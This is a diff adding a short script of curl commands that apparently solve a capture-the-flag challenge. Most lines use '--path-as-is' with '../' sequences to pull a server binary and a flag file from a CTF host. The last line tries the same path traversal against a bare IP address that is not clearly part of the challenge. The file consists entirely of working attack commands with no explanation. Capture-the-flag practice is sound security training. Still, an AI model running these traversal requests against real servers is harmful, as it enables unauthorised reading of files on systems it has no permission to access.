@@ -1,0 +1,7 @@
+curl -vvv --path-as-is http://ctf.cscml.zenysec.com:20003/../tiny --output tiny
+curl -vvv --path-as-is http://ctf.cscml.zenysec.com:20003/read_flag --output read_flag
+curl -vvv --path-as-is http://ctf.cscml.zenysec.com:20003/index.html --output index.html
+curl -vvv --path-as-is http://ctf.cscml.zenysec.com:20003/ -H "Connection: keep-alive"
+
+
+curl -vvv --path-as-is http://164.90.176.158/index.php/../
